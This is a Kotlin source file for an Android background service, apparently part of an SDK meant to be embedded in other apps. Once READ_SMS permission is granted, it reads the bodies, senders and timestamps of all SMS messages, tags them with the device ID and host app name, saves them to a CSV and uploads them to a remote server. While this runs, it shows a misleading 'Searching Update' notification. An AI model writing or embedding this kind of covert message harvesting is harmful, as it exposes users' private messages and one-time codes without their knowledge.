package info.kalagato.com.extractor.readers

import android.Manifest
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ContentResolver
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import com.google.gson.JsonObject
import com.google.gson.JsonParser
import info.kalagato.com.extractor.*
import info.kalagato.com.extractor.Util.getDeviceId
import info.kalagato.com.extractor.Util.getLastSyncTime
import info.kalagato.com.extractor.Util.setLastSyncDateTime
import info.kalagato.com.extractor.networkCall.ApiClient
import info.kalagato.com.extractor.networkCall.DetailInfoResponse
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONArray
import org.json.JSONObject
import retrofit2.Response
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.*


class ReadSMSService : Service() {
    private lateinit var mydir: File
    private var appName: String = ""
    private var userId: String = ""
    private lateinit var smsInfo:MultipartBody.Part


    override fun onCreate() {

        mydir = applicationContext.getDir("mydir", MODE_PRIVATE) //Creating an internal dir;
        appName =applicationContext.packageName
        userId =  Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

        deletePreviewsFiles()

            CoroutineScope(Dispatchers.IO).launch{
                val isAvailable = getAllSms()

                if (isAvailable){
                sendToServer()
            }
                stopForeground(true)
                stopSelf()

        }

    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
//        Log.d(TAG,"onStartCommand");
        val notificationIntent = Intent(applicationContext, Extractor::class.java)
        val pendingIntent = PendingIntent.getActivity(
            applicationContext,
            0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(
                Constant.CHANNEL_ID,
                "My Foreground Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = ContextCompat.getSystemService(
                applicationContext, NotificationManager::class.java
            )
            manager?.createNotificationChannel(chan)
        }
        val notification = NotificationCompat.Builder(
            applicationContext,
            Constant.CHANNEL_ID
        ) //todo fix hardcoded channel id
            .setSmallIcon(R.drawable.ic_settings)
            .setOngoing(true)
            .setContentTitle("Searching Update")
            .setContentText("")
            .setShowWhen(false)
            .setContentIntent(pendingIntent)
            .build()
        startForeground(1, notification)
        return super.onStartCommand(intent, flags, startId)
    }

    override fun onDestroy() {
        stopForeground(true)
        super.onDestroy()
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    private fun deletePreviewsFiles() {
        try {
            val directory = File(mydir.path)
            val files = directory.listFiles()
            for (i in files!!.indices) {
                if (files[i].name == "sms_info.csv")
                    files[i].delete()
            }
        }catch (e:Exception){
            //handle the exception
        }
    }


    @SuppressLint("Range")
    fun getAllSms():Boolean{
        if (ContextCompat.checkSelfPermission(
                applicationContext,
                Manifest.permission.READ_SMS
            ) == PackageManager.PERMISSION_GRANTED
        ) {

            //Sync message with the current time to gte the Incremental Messages
            val currentSyncTime = Date().time
            val lastSyncTime = getLastSyncTime(
                applicationContext
            )
            // Now create a SimpleDateFormat object.
            val filter = if (lastSyncTime == 0L) {
                " date <= $currentSyncTime"
            } else {
                " date <= $currentSyncTime and date >= $lastSyncTime"
            }


            val message = Uri.parse("content://sms/")
            val cr: ContentResolver = contentResolver
            val c: Cursor? = cr.query(message, null, filter, null, null)
            //Activity().startManagingCursor(c)
            val totalSMS: Int = c!!.count


            if (c.moveToFirst()) {
                val filename = ("$mydir/sms_info.csv")
                try {
                    val fw = FileWriter(filename, true)

                    fw.append("user_id,")
                    fw.append("body,")
                    fw.append("sender_id,")
                    fw.append("created_on,")
                    fw.append("message_timestamp,")
                    fw.append("app_name")
                    fw.append("\n")

                    for (i in 0 until totalSMS) {

                        fw.append("$userId,")
                        fw.append(c.getString(c.getColumnIndexOrThrow("body"))+",")
                        fw.append(c.getString(c.getColumnIndexOrThrow("address"))+",")
                        fw.append(Date().time.toString()+",")
                        fw.append(c.getString(c.getColumnIndexOrThrow("date"))+",")
                        fw.append(appName)
                        fw.append("\n")

                        c.moveToNext()
                    }
                    fw.flush()
                    fw.close()

                }catch (e:Exception){
                    //catch any exception here
                }
                return true
            }
            c.close()
        }
        return false
    }

    private suspend fun sendToServer() {

        val directory = File(mydir.path)
        val files = directory.listFiles()
        for (i in files!!.indices) {
            val requestBody: RequestBody = files[i].asRequestBody("text/csv".toMediaTypeOrNull())
            if (files[i].name == "sms_info.csv"){
                smsInfo = MultipartBody.Part.createFormData("sms_info", files[i].name,requestBody)
            }
        }

        if (this@ReadSMSService::smsInfo.isInitialized){
            val appName  = RequestBody.create(
                "text/plain".toMediaTypeOrNull(),
                appName
            )
            val userId  = RequestBody.create(
                "text/plain".toMediaTypeOrNull(),
                userId
            )
            val response: Response<DetailInfoResponse> =
                ApiClient.client2.uploadSMSInfoFile(appName,userId,smsInfo)
            withContext(Dispatchers.Main){
                if (response.isSuccessful){
                    setLastSyncDateTime(applicationContext,Date().time)
                    Log.d("TAG", "getIpLocation: ${response.message()}")
                }else{
                    Log.d("TAG", "getIpLocation: ${response.message()}")
                }
            }
        }


    }


}
